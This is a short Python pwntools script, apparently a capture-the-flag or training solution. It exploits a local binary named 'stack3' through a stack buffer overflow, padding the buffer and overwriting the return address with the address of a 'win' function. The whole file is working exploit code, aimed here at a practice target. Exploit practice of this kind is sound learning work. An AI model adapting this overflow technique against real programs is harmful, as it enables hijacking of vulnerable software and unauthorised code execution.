from pwn import *

p = process('./stack3')
e = ELF('./stack3')

context.log_level = 'debug'

win = e.symbols['win']

payload = b'A' * (0x50 - 0x8)
payload += p64(win)

p.sendline(payload)

data = p.recv(1024)

print(data.decode('utf-8'))